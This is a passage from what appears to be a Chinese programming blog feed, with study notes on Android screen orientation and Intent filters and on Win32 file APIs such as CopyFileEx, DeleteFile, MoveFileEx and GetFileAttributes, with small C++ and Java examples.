    <content><![CDATA[<h2 id="横竖屏的设置"><a href="#横竖屏的设置" class="headerlink" title="横竖屏的设置"></a>横竖屏的设置</h2><p>在Android的生命周期中，如果我们横竖屏了，那么他将会默认执行销毁和重构Activity界面的一系列操作，这个样子给我们带来了很多麻烦。<br>同样的屏幕大小变换（低版本安卓不会），键盘出现都会出现这个问题，那如何解决：<br>我们在Activity设置中设置：<br><code>android:configChanges=&quot;keyboardHidden|orientation|screenSize&quot;</code><br>设置这么一条代码，就可以实现我们的效果了，这样的话呢我们将不会执行那一系列操作（相当于关程序重新打开程序的操作）了，它将会执行新的一个函数：<code>onConfigurationChanged</code>这个函数，我们只需要在这个地方写代码就好了。</p>
<h2 id="如何知道是横竖屏？"><a href="#如何知道是横竖屏？" class="headerlink" title="如何知道是横竖屏？"></a>如何知道是横竖屏？</h2><p>其实也很简单，就是判断宽和高就可以了！<br>例如如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DisplayMetrics dm = <span class="keyword">new</span> DisplayMetrics();</span><br><span class="line"></span><br><span class="line">getWindowManager().getDefaultDisplay().getMetrics(dm);</span><br><span class="line">Log.d(<span class="string">"ttt"</span>, dm.heightPixels+<span class="string">""</span>+dm.widthPixels);</span><br></pre></td></tr></table></figure>
<p>再就是判断宽和高大小就可以了！</p>
<h2 id="设置一直是横竖屏"><a href="#设置一直是横竖屏" class="headerlink" title="设置一直是横竖屏"></a>设置一直是横竖屏</h2><p>其实也很简单，在Activity配置中配置如下项：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">android:screenOrientation="portrait"</span><br><span class="line">android:screenOrientation="landscape"</span><br></pre></td></tr></table></figure>
<p>第一个设置竖屏，第二个设置横屏（只能设置一个！）。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>File operate2</title>
    <url>/2020/01/26/File-operate2/</url>
    <content><![CDATA[<h2 id="CopyFileEx文件拷贝"><a href="#CopyFileEx文件拷贝" class="headerlink" title="CopyFileEx文件拷贝"></a><code>CopyFileEx</code>文件拷贝</h2><p>一开始想用<code>CopyFile</code>,后来看到了这个，那就快用这个吧，还支持回调函数，看一下MSDN的一个定义：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CopyFileEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR lpExistingFileName,</span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="comment">// pointer to name of an existing file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR lpNewFileName,</span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="comment">// pointer to filename to copy to</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPPROGRESS_ROUTINE lpProgressRoutine,</span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="comment">// pointer to the callback function</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpData,    <span class="comment">// to be passed to the callback function</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPBOOL pbCancel,  <span class="comment">// flag that can be used to cancel the operation</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwCopyFlags <span class="comment">// flags that specify how the file is copied</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>前两个还是比较简单的，第三个参数是一个回调函数，定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD CALLBACK <span class="title">CopyProgressRoutine</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER TotalFileSize,  <span class="comment">// total file size, in bytes</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER TotalBytesTransferred,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="comment">// total number of bytes transferred</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER StreamSize,  <span class="comment">// total number of bytes for this stream</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER StreamBytesTransferred,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="comment">// total number of bytes transferred for </span></span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="comment">// this stream</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwStreamNumber,     <span class="comment">// the current stream</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwCallbackReason,   <span class="comment">// reason for callback</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hSourceFile,       <span class="comment">// handle to the source file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hDestinationFile,  <span class="comment">// handle to the destination file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpData             <span class="comment">// passed by CopyFileEx</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>第四个参数是要传递给回调函数的一个参数，可以为NULL，<br>第五个参数有点意思，就是为了防止文件过大，给了个可以强制结束的一个指针，BOOL类型的，如歌这个指针为TRUE的时候则会终止。<br>第六个参数是一个复制的类型，可以是下面这两个值：</p>
<table>
<thead>
<tr>
<th>Value</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>COPY_FILE_FAIL_IF_EXISTS</td>
<td>The copy operation fails immediately if the target file already exists.</td>
</tr>
<tr>
<td>COPY_FILE_RESTARTABLE</td>
<td>Progress of the copy is tracked in the target file in case the copy fails. The failed copy can be restarted at a later time by specifying the same values for lpExistingFileName and lpNewFileName as those used in the call that failed.</td>
</tr>
<tr>
<td>看名字就明白了，失败退出，失败重新。</td>
<td></td>
</tr>
<tr>
<td>那我们就试一下怎么个回事。</td>
<td></td>
</tr>
<tr>
<td><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function">DWORD CALLBACK <span class="title">CopyProgressRoutine</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER TotalFileSize,  <span class="comment">// total file size, in bytes</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER TotalBytesTransferred,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="comment">// total number of bytes transferred</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER StreamSize,  <span class="comment">// total number of bytes for this stream</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER StreamBytesTransferred,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="comment">// total number of bytes transferred for </span></span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="comment">// this stream</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwStreamNumber,     <span class="comment">// the current stream</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwCallbackReason,   <span class="comment">// reason for callback</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hSourceFile,       <span class="comment">// handle to the source file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hDestinationFile,  <span class="comment">// handle to the destination file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpData             <span class="comment">// passed by CopyFileEx</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,TotalBytesTransferred.u.LowPart);</span><br><span class="line">	<span class="keyword">return</span> PROGRESS_CONTINUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CopyFileEx(<span class="string">"1.zip"</span>,<span class="string">"1\\3.zip"</span>,CopyProgressRoutine,<span class="literal">NULL</span>,<span class="literal">NULL</span>,COPY_FILE_RESTARTABLE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></td>
<td></td>
</tr>
<tr>
<td>看了下，主要就是那个回调函数的返回值比较重要一些，要继续的话呢要返回一个<code>PROGRESS_CONTINUE</code>这个值，其他的都不是太重要，仔细看看参数就好了。</td>
<td></td>
</tr>
<tr>
<td>## 删除文件<code>DeleteFile</code></td>
<td></td>
</tr>
<tr>
<td>这个基本不用说，看下定义就知道了，就一个参数，删除的文件路径。</td>
<td></td>
</tr>
<tr>
<td><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DeleteFile</span><span class="params">(  LPCTSTR lpFileName   <span class="comment">// pointer to name of file to delete</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure></td>
<td></td>
</tr>
<tr>
<td>但是在这里我还是要说一些比较关键的一些内容，删除不存在的文件的时候是会失败的，如果删除的文件是一个只读的属性，那么将会返回：ERROR_ACCESS_DENIED这个样子的一个值，这里我们写一个递归的函数（使用MFC的框架）实现递归删除。</td>
<td></td>
</tr>
<tr>
<td><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CStudy_HistoryDlg::OnBnClickedButton1()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">	CString Context ;EContext.GetWindowTextA(Context);</span><br><span class="line">	RecursiveDelete(Context);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CStudy_HistoryDlg::RecursiveDelete(CString szPath)</span><br><span class="line">&#123;</span><br><span class="line">	CFileFind ff;</span><br><span class="line">	CString strPath = szPath;</span><br><span class="line">	<span class="keyword">if</span> (<span class="string">"\\"</span> != strPath.Right(<span class="number">1</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		strPath += <span class="string">"\\"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	strPath += <span class="string">"*.*"</span>;<span class="comment">//这个过滤器类型的东西貌似都是支持正则的。</span></span><br><span class="line">	BOOL bRet;<span class="comment">//用来标记是不是已经删除完毕。</span></span><br><span class="line">	<span class="keyword">if</span> (ff.FindFile(strPath))<span class="comment">//这个应该就是文件夹的第一个指针开始。</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">do</span> </span><br><span class="line">		&#123;</span><br><span class="line">			bRet = ff.FindNextFile();<span class="comment">//将内部的那个指针往下移动一下</span></span><br><span class="line">			<span class="keyword">if</span> (ff.IsDots())<span class="comment">//为.或..这种的上级目录</span></span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			strPath = ff.GetFilePath();</span><br><span class="line">			<span class="keyword">if</span> (!ff.IsDirectory())<span class="comment">//看看是不是一个目录</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">//是一个文件</span></span><br><span class="line">				<span class="comment">//删除文件</span></span><br><span class="line">				::SetFileAttributes(strPath,FILE_ATTRIBUTE_NORMAL);<span class="comment">//先设置一下这个文件的属性，不要只读！！！</span></span><br><span class="line">				::DeleteFile(strPath);</span><br><span class="line"></span><br><span class="line">			&#125;<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				RecursiveDelete(strPath);<span class="comment">//经典的递归调用</span></span><br><span class="line">				::SetFileAttributes(strPath,FILE_ATTRIBUTE_NORMAL);<span class="comment">//和上面一样</span></span><br><span class="line">				::RemoveDirectory(strPath); <span class="comment">//移除掉这个文件夹</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">while</span> (bRet);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></td>
<td></td>
</tr>
<tr>
<td>我都做了一定的注释，就是一个递归删除，使用了MFC的一个框架，说实话微软给的这个框架是真的好！</td>
<td></td>
</tr>
<tr>
<td>需要注意，我们使用<code>DeleteFile</code>这个函数的话呢，是不会进入回收站的！</td>
<td></td>
</tr>
</tbody></table>
<h2 id="移动文件MoveFileEx"><a href="#移动文件MoveFileEx" class="headerlink" title="移动文件MoveFileEx"></a>移动文件<code>MoveFileEx</code></h2><p>这次还是在用个Ex加强版本的吧，看一下Ex版本的MSDN定义：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">MoveFileEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpExistingFileName,  <span class="comment">// pointer to the name of the existing file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpNewFileName,       <span class="comment">// pointer to the new name for the file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFlags                <span class="comment">// flag that specifies how to move file</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>第三个的参数有点古怪：<br>比较有意思的一个值：“MOVEFILE_DELAY_UNTIL_REBOOT”，这个值的意思就是说重启才会移动，具体怎么用我也没有去深入研究，没啥意思我感觉，而且与其他的不能同时使用。<br>MOVEFILE_COPY_ALLOWED：这个就是说可以移动到别的盘符，还有就是好像指定了这个就是类似于先Copy再删除这个样子的操作。<br>MOVEFILE_REPLACE_EXISTING：替换掉存在的。<br>MOVEFILE_WRITE_THROUGH：这个就是说等待函数结束才会返回。<br>说了这么多就实验一下吧。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MoveFileEx(<span class="string">"1.txt"</span>,<span class="string">"2.txt"</span>,MOVEFILE_COPY_ALLOWED|MOVEFILE_REPLACE_EXISTING|MOVEFILE_WRITE_THROUGH);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>好吧也没啥可以验证的…</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>File Attribute</title>
    <url>/2020/01/24/File-Attribute/</url>
    <content><![CDATA[<h1 id="文件属性的读取"><a href="#文件属性的读取" class="headerlink" title="文件属性的读取"></a>文件属性的读取</h1><p>文件属性的一些读取，主要就是依靠。</p>
<h2 id="GetFileType获取文件类型"><a href="#GetFileType获取文件类型" class="headerlink" title="GetFileType获取文件类型"></a><code>GetFileType</code>获取文件类型</h2><p>就一个参数，文件句柄，<code>CreateFile</code>获得的，返回值：</p>
<table>
<thead>
<tr>
<th>Value</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>FILE_TYPE_UNKNOWN</td>
<td>The type of the specified file is unknown.</td>
</tr>
<tr>
<td>FILE_TYPE_DISK</td>
<td>The specified file is a disk file.</td>
</tr>
<tr>
<td>FILE_TYPE_CHAR</td>
<td>The specified file is a character file, typically an LPT device or a console.</td>
</tr>
<tr>
<td>FILE_TYPE_PIPE</td>
<td>The specified file is either a named or anonymous pipe.</td>
</tr>
</tbody></table>
<h2 id="GetFileSize获取文件尺寸"><a href="#GetFileSize获取文件尺寸" class="headerlink" title="GetFileSize获取文件尺寸"></a><code>GetFileSize</code>获取文件尺寸</h2><p>这个函数用来获取文件的大小，在读取文件的时候很好用</p>
<p><strong>如果函数成功，则返回的值是文件大小的低阶双字，如果lpFileSizeHigh是非null，则函数将文件大小的高阶双字放入该参数指向的变量中。<br>如果函数失败且lpFileSizeHigh为NULL，则返回值为0xFFFFFFFF。要获取扩展的错误信息，请调用GetLastError。<br>如果函数失败并且lpFileSizeHigh是非空的，则返回值为0xFFFFFFFF, GetLastError将返回一个NO_ERROR以外的值。</strong><br>返回值的一个判定，简单看看就好了。</p>
<h2 id="GetFileAttributes获取文件属性"><a href="#GetFileAttributes获取文件属性" class="headerlink" title="GetFileAttributes获取文件属性"></a><code>GetFileAttributes</code>获取文件属性</h2><p>这个东西不复杂就是有点乱，参数就是一个字符串，不要忘记转义就好了。<br>看一下MSDN的一些说明。</p>
<table>
<thead>
<tr>
<th>Attribute</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>FILE_ATTRIBUTE_ARCHIVE</td>
<td>The file or directory is an archive file or directory. Applications use this attribute to mark files for backup or removal.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_COMPRESSED</td>
<td>The file or directory is compressed. For a file, this means that all of the data in the file is compressed. For a directory, this means that compression is the default for newly created files and subdirectories.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_DIRECTORY</td>
<td>The handle identifies a directory.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_ENCRYPTED</td>
<td>The file or directory is encrypted. For a file, this means that all data streams are encrypted. For a directory, this means that encryption is the default for newly created files and subdirectories.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_HIDDEN</td>
<td>The file or directory is hidden. It is not included in an ordinary directory listing.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_NORMAL</td>
<td>The file or directory has no other attributes set. This attribute is valid only if used alone.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_OFFLINE</td>
<td>The data of the file is not immediately available. Indicates that the file data has been physically moved to offline storage.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_READONLY</td>
<td>The file or directory is read-only. Applications can read the file but cannot write to it or delete it. In the case of a directory, applications cannot delete it.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_REPARSE_POINT</td>
<td>The file has an associated reparse point.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_SPARSE_FILE</td>
<td>The file is a sparse file.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_SYSTEM</td>
<td>The file or directory is part of, or is used exclusively by, the operating system.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_TEMPORARY</td>
<td>The file is being used for temporary storage. File systems attempt to keep all of the data in memory for quicker access rather than flushing the data back to mass storage. A temporary file should be deleted by the application as soon as it is no longer needed.</td>
</tr>
<tr>
<td>（呼~，终于写完了，手都累酸了）</td>
<td></td>
</tr>
</tbody></table>
<p>返回值就是这样子判断，这些东西对与目录一样也是适用的。<br>示例代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD dwAttributes = GetFileAttributes(<span class="string">"Wker.txt"</span>) ; </span><br><span class="line">	<span class="keyword">if</span>(dwAttributes == <span class="number">0XFFFFFFFF</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"这是个什么东西？"</span>; </span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>((dwAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"啊！是个目录啊"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"啊!是个文件啊"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>设置文件属性：<code>SetFileAttributes</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetFileAttributes</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpFileName,  <span class="comment">// pointer to filename</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFileAttributes   <span class="comment">// attributes to set</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>参数就不介绍了，很简单，第二个参数值太多，百度一下就可以了。</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Intent-过滤器</title>
    <url>/2020/01/24/Intent-%E8%BF%87%E6%BB%A4%E5%99%A8/</url>
    <content><![CDATA[<h1 id="Intent过滤器"><a href="#Intent过滤器" class="headerlink" title="Intent过滤器"></a>Intent过滤器</h1><p>这个东西就是一个过滤器，用于过滤intent发送给Activity信息的时候对发送对象的一个过滤，那么我们具体怎么使用呢？<br>首先我们需要用隐式Intent进行消息的发送，首先我们对我们的Activity进行过滤器的设置例如如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">intent-filter</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.wker.top"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">"http"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>例如这个样子，我们需要设置intent的时候是这个样子的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">intent.setAction(<span class="string">"com.wker.top"</span>);</span><br><span class="line">intent.addCategory(Intent.CATEGORY_DEFAULT);</span><br><span class="line">intent.setData(Uri.parse(<span class="string">"http:"</span>));</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
<p>这个时候我们需要注意，我们设置的协议scheme的时候是http，但是我们要用Data数据的时候我们需要填写完整的‘http:’，这个使我们需要注意的，这个时候我们就能成功的打开我们的页面了，那么我们看到Data还有好多的属性，我们继续设置。主要看我们的Data数据设置和我们的URI的一个设置。<br><code>&lt;data android:scheme=&quot;http&quot; android:host=&quot;wker666.github.io&quot; android:port=&quot;80&quot; android:path=&quot;/Android&quot;/&gt;</code><br><code>intent.setData(Uri.parse(&quot;http://wker666.github.io:80/Android&quot;));</code><br>其实可以看到也就是按照一个URL类似的格式进行填写的。<br><strong>Intent过滤器中的category属性称之为类别判定，其实也很好理解，就是对于APP类型的一个判定（我猜的，因为我看到值有default和browser这类的值，所以我感觉应该就是），而且这里还需要注意，可以设置多个category是不会影响的，就是说一个正确了其他的不正确也不影响。</strong></p>
<p>而且category这个节点的属性是必须存在的！！！</p>
<p>下面说说Data这个节点的属性，有点繁杂，但是也是比较好用的，重点的上面提到了，主要说说那个mimeType：</p>
<table>
<thead>
<tr>
<th>文件拓展名</th>
<th>MIMEType</th>
</tr>
</thead>
<tbody><tr>
<td>png</td>
<td>image/png</td>
</tr>
<tr>
<td>bmp\dib</td>
<td>image/bmp</td>
</tr>
<tr>
<td>jpg\jpeg\jpg</td>
<td>image/ipeg</td>
</tr>
<tr>
<td>gif</td>
<td>image/gif</td>
</tr>
<tr>
<td>mp3</td>
<td>audio/mpeg</td>
</tr>
<tr>
<td>mp4\mpg4\m4v\mp4v</td>
<td>video/mp4</td>
</tr>
<tr>
<td>js</td>
<td>application/javascript</td>
</tr>
<tr>
<td>pdf</td>
<td>application/pdf</td>
</tr>
<tr>
<td>text\txt</td>
<td>text/plan</td>
</tr>
<tr>
<td>json</td>
<td>application/json</td>
</tr>
<tr>
<td>xml</td>
<td>text/xml</td>
</tr>
</tbody></table>
<p>这个就是从网上摘录的一部分，在网站上经常见到，就是来设定格式的，在渗透测试中需要注意就是只是单纯的过滤这个格式的话呢是存在漏洞的，之后再提这个，但是在Win32中这个东西简直是个噩梦，之后有机会再说。<br>这个东西有点两样，谷歌把他单纯的分离出来了，而且它的函数比较特殊，我们来看一下。<br><code>SetDate</code>：<em>This method automaticallyclears any type that was previously set by setType or setTypeAndNormalize. *<br>很怪，这东西的意思是说会清除我们之前设置的<code>setType</code>，然而我们我们的<code>setType</code>这个也是：</em>This method automatically clears any data that waspreviously set (for example by setData). *<br>就是一个矛盾的函数，那么我们怎么办？谷歌给我们了一个方法专门用来解决这个问题：<br><code>intent.setDataAndType(data, type)</code><br>这个方法就是可以解决的，我们的XML设置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">"http"</span> <span class="attr">android:host</span>=<span class="string">"wker666.github.io"</span> <span class="attr">android:port</span>=<span class="string">"80"</span> <span class="attr">android:path</span>=<span class="string">"/Android"</span> <span class="attr">android:mimeType</span>=<span class="string">"text/plan"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>Intent设置：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">intent.setDataAndType(Uri.parse(<span class="string">"http://wker666.github.io:80/Android"</span>), <span class="string">"text/plan"</span>);</span><br></pre></td></tr></table></figure>
<p>这个样子就是正常了的！</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>File operate</title>
    <url>/2020/01/24/File-operate/</url>
    <content><![CDATA[<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><p>上篇博客说道了强大的CreateFile函数，现在就介绍如何进行文件的具体操作。</p>
<h2 id="SetFilePointer移动文件指针"><a href="#SetFilePointer移动文件指针" class="headerlink" title="SetFilePointer移动文件指针"></a><code>SetFilePointer</code>移动文件指针</h2><p>读文件的时候我们要标志我们具体读到了哪个地方，那么我们就需要一个指针，这个指针代表我们具体读到了什么地方。<br><code>SetFilePointer</code>这个函数就是设置这个指针的位置，方便我们可以随机读取文件。<br>看下MSDN的一个介绍：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">SetFilePointer</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hFile,          <span class="comment">// handle of file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LONG lDistanceToMove,  <span class="comment">// number of bytes to move file pointer</span></span></span></span><br><span class="line"><span class="function"><span class="params">  PLONG lpDistanceToMoveHigh,</span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="comment">// pointer to high-order DWORD of </span></span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="comment">// distance to move</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwMoveMethod     <span class="comment">// how to move</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<ol>
<li><code>hFile</code>这个就是我们打开文件的一个文件句柄，通过CreateFile就可获得。</li>
<li><code>lDistanceToMove</code>移动的一个距离</li>
<li><code>lpDistanceToMoveHigh</code>看名字就知道了这个是移动距离的高32位，一般至于超大文件才会用的到。</li>
<li><code>dwMoveMethod</code>指针的一个移动方式，主要是下面这三个值：<ul>
<li>FILE_BEGIN：从文件的开头进行移动</li>
<li>FILE_CURRENT：从当前的一个位置进行移动</li>
<li>FILE_END：从文件的结尾进行移动<br>简单易懂一下就看明白了。</li>
</ul>
</li>
</ol>
<p>返回值就是当前文件指针的位置，如果失败就是-1。<br>这个函数有个强大的功能，就是说比如你当前的这个文件有100KB，但是我却移动到了1000KB，那么再写入的时候我的文件就会增大。</p>
<h2 id="SetEndOfFile截断文件"><a href="#SetEndOfFile截断文件" class="headerlink" title="SetEndOfFile截断文件"></a><code>SetEndOfFile</code>截断文件</h2><p><code>SetEndOfFile</code>这个函数MSDN的一个定义：*The SetEndOfFile function moves the end-of-file (EOF) position for the specified file to the current position of the file pointer. *<br>简单的翻译一下：SetEndOfFile函数将指定文件的end-of (EOF)位置移动到文件指针的当前位置。<br>其实简单的说作用就是用来截断文件的。可以用来扩展，也可以用来截断一部分。</p>
<h2 id="ReadFile与WriteFile"><a href="#ReadFile与WriteFile" class="headerlink" title="ReadFile与WriteFile"></a><code>ReadFile</code>与<code>WriteFile</code></h2><p>看名字就知道这是读写文件的操作<br>首先我们看一下ReadFile的一个文件定义：</p>
